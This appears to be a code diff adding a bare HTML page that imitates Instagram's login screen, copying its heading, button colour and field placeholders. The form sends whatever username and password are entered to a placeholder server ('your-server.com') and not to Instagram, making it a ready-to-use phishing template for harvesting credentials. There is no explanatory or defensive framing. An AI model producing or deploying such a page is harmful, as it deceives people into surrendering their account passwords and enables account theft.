@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body { font-family: Arial, sans-serif; }
+        .container { width: 300px; margin: 0 auto; }
+        .input-box { margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 10px; }
+        .button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; cursor: pointer; }
+        .button:hover { background-color: #007bb6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Instagram</h2>
+        <form action="https://your-server.com/login" method="post">
+            <div class="input-box">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+            </div>
+            <div class="input-box">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <input type="submit" value="Log In" class="button">
+        </form>
+    </div>
+
+</body></html>
